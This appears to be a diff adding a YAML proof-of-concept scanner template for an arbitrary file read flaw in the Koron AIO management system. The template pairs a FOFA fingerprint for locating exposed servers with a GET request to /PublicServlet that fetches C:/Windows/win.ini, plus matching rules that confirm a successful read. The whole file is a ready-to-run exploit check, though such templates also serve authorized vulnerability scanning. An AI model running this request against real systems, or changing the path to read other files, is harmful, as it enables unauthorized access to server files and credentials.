@@ -1,0 +1,15 @@
+id: poc-yaml-koron-aio-publicservlet-anyfile-read
+info:
+  name: 科荣 AIO管理系统 PublicServlet 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 科荣 AIO 管理系统
+  fofa: body="changeAccount('8000')"
+requests:
+- method: GET
+  path: /PublicServlet?operation=downLoadFiles&path=C:/WIndows/win.ini&pho=
+  expression: status_code == 200 && contains(body,"win.ini") && contains(headers,"filename=files.rar")
+    && contains(content_type,"application/octet-stream") && !contains(body,"<")
+variables: {}
+transport: http
